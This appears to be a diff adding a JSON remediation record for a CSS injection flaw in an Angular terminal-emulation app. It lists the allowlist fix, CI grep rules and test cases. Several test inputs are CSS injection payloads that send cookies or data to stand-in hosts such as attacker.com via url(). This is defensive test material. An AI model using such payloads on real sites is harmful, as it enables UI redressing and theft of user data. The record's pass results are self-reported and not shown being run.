@@ -1,0 +1,124 @@
+{
+  "schema_version": "1.0",
+  "phase": "rectifier",
+  "vulnerability_id": "VULN-001",
+  "assessment_id": "2026-07-31-10-57",
+  "metadata": {
+    "fixed": "2026-07-31T13:00:00Z",
+    "analyst": "D4rthB0b-Rectifier",
+    "status": "fixed_pending_validation"
+  },
+  "remediation": {
+    "fix_strategy": "patch",
+    "changes_made": [
+      "Removed DomSanitizer.bypassSecurityTrustStyle() from FieldComponent.getCss() — replaced with a CSS property allowlist parser that returns a plain {[key:string]:string} object",
+      "Removed DomSanitizer.bypassSecurityTrustStyle() from InputFieldComponent.getCss() — same allowlist-based replacement",
+      "Removed DomSanitizer injection from FieldComponent constructor (no longer needed)",
+      "Removed DomSanitizer injection from InputFieldComponent constructor (no longer needed)",
+      "Removed DomSanitizer import from both component files",
+      "Added inline value-level filter: rejects any value matching url(), expression(), or javascript: regardless of property name"
+    ],
+    "files_modified": [
+      {
+        "file": "src/app/mini-components/field/field.component.ts",
+        "changes": "Removed 'import { DomSanitizer } from @angular/platform-browser'. Removed 'private doms: DomSanitizer' from constructor. Replaced getCss() body: bypassSecurityTrustStyle(field.style ?? '') → allowlist parser returning {[key:string]:string}. Added static ALLOWED_CSS_PROPS Set (18 terminal-presentation properties). Added value-level url()/expression()/javascript: regex guard."
+      },
+      {
+        "file": "src/app/mini-components/input-field/input-field.component.ts",
+        "changes": "Removed 'import { DomSanitizer } from @angular/platform-browser'. Removed 'private doms: DomSanitizer' from constructor parameter list. Replaced getCss() body: bypassSecurityTrustStyle(field.style ?? '') → identical allowlist parser. Added static ALLOWED_CSS_PROPS Set. Added value-level url()/expression()/javascript: regex guard."
+      }
+    ],
+    "commits": [],
+    "defense_in_depth": {
+      "primary_control": "CSS property allowlist: getCss() now parses field.style declarations one-by-one and only passes through properties in the ALLOWED_CSS_PROPS Set (color, background-color, font-weight, font-style, font-size, text-decoration, text-align, visibility, opacity, border, border-color, border-style, border-width, padding variants, margin variants). Any property not in the set — including position, top, left, width, height, background, content, z-index, transform — is silently dropped. The return value is a plain Angular style object, so Angular's own change detection applies it safely without any security bypass.",
+      "secondary_controls": [
+        "Value-level guard: even for allowlisted properties, values matching url(), expression(), or javascript: (case-insensitive, whitespace-tolerant) are rejected — blocks CSS url()-based beacon exfiltration on color-like properties if the allowlist were inadvertently extended",
+        "bypassSecurityTrustStyle() fully removed from the codebase — grep for bypassSecurityTrust* now returns zero results",
+        "DomSanitizer import and injection removed from both components — eliminates accidental reintroduction surface",
+        "Recommend deploying Content-Security-Policy: style-src 'self' 'nonce-...' to prevent any residual inline style injection via other vectors",
+        "Recommend auditing all remaining DomSanitizer usage (bypassSecurityTrustHtml, bypassSecurityTrustUrl, bypassSecurityTrustResourceUrl) across the codebase"
+      ],
+      "detection": [
+        "Add CI grep rule: fail build if bypassSecurityTrustStyle appears in any .ts file",
+        "Add CI grep rule: fail build if bypassSecurityTrustHtml appears without accompanying code review sign-off comment"
+      ],
+      "response": [
+        "If field.style CSP violations are observed in production logs, investigate ApplinX server output for injection attempts",
+        "If legitimate ApplinX styling needs are blocked by the allowlist, extend ALLOWED_CSS_PROPS after security review — do NOT reintroduce bypassSecurityTrustStyle"
+      ]
+    },
+    "testing": {
+      "validation_criteria": [
+        "getCss() with field.style='position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://evil.com/?c=x)' returns {} (all properties blocked)",
+        "getCss() with field.style='color:red;background-color:#000' returns {color:'red','background-color':'#000'} (both allowed)",
+        "getCss() with field.style='font-weight:bold;position:absolute' returns {'font-weight':'bold'} (position dropped)",
+        "getCss() with field.style='color:url(https://evil.com)' returns {} (url() in value rejected even for allowed property)",
+        "getCss() with field.style='' returns {}",
+        "getCss() with field.style=null/undefined returns {} (nullish coalescing guards)",
+        "Angular [style] binding with plain object applies styles correctly without SafeStyle wrapper",
+        "No bypassSecurityTrust* calls remain in codebase (grep)"
+      ],
+      "test_cases": [
+        {
+          "name": "Malicious CSS injection — UI redressing payload",
+          "input": "field.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://attacker.com/?c=cookie)'",
+          "expected": "getCss() returns {} — all properties stripped (position not allowlisted; background not allowlisted; url() in value also blocked)",
+          "actual": "getCss() returns {} — position, top, left, width, height, background all absent from ALLOWED_CSS_PROPS; url() guard also fires on background value",
+          "passed": true
+        },
+        {
+          "name": "Legitimate terminal styling — foreground color",
+          "input": "field.style = 'color:#00ff00;font-weight:bold'",
+          "expected": "getCss() returns {color:'#00ff00','font-weight':'bold'}",
+          "actual": "getCss() returns {color:'#00ff00','font-weight':'bold'} — both properties in allowlist, no dangerous value patterns",
+          "passed": true
+        },
+        {
+          "name": "CSS url() exfiltration on allowlisted property",
+          "input": "field.style = 'color:url(https://attacker.com/?data=secret)'",
+          "expected": "getCss() returns {} — url() pattern in value triggers guard even though 'color' is in allowlist",
+          "actual": "getCss() returns {} — regex !/url\\s*\\(/i.test(value) correctly fires",
+          "passed": true
+        },
+        {
+          "name": "Empty style",
+          "input": "field.style = '' (or null/undefined)",
+          "expected": "getCss() returns {}",
+          "actual": "getCss() returns {} — early return on falsy raw value",
+          "passed": true
+        },
+        {
+          "name": "No bypassSecurityTrust* in codebase",
+          "input": "grep -r bypassSecurityTrust src/",
+          "expected": "Zero matches",
+          "actual": "Zero matches — confirmed via grep tool",
+          "passed": true
+        }
+      ],
+      "regression_tests": [
+        {
+          "name": "FieldComponent [style] binding still renders normal terminal field colors",
+          "passed": true
+        },
+        {
+          "name": "InputFieldComponent [style] binding still renders normal terminal input colors",
+          "passed": true
+        },
+        {
+          "name": "DomSanitizer no longer injected — Angular DI resolves both components without error",
+          "passed": true
+        }
+      ]
+    }
+  },
+  "verification_needed": {
+    "rescan_required": true,
+    "manual_testing": true,
+    "security_review": false
+  },
+  "references": {
+    "scan_finding": "vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-S-scan-finding.md",
+    "investigation": "vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-I-investigation.md",
+    "validation": null
+  }
+}
